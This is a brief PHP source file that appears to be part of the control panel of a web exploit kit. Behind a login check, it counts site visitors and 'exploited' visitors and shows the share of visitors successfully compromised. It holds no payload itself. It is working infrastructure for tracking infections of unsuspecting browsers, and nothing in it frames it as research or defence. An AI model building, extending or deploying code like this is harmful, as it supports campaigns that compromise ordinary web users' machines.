<?


include('../config.php');
include('../include/sql.php');
include('../include/visitors.php');

session_start();
if(($_SESSION["login"] == false)){
	exit();	
}

$sql = new CSQL($sqlSettings);
$sql->open();
	
$cvisitors = new CVisitors($sql, $sqlSettings);
	
$countVisitors = $cvisitors->getUniqueVisitorsCount();
$countExploitedVisitors = $cvisitors->getVisitorsExploitedCount();
$countNotExploitedVisitors = $countVisitors - $countExploitedVisitors;
	
	
if($countVisitors == 0 || $countExploitedVisitors == 0){
	$exploitedPercentage = 0;
}else{
	$exploitedPercentage = round($countExploitedVisitors * 100 / $countVisitors, 2);
}

?>

document.getElementById("visitors").innerHTML = <? echo $countVisitors; ?>;
document.getElementById("exploited").innerHTML = <? echo $countExploitedVisitors; ?>;
document.getElementById("percentage").innerHTML = <? echo $exploitedPercentage; ?>;
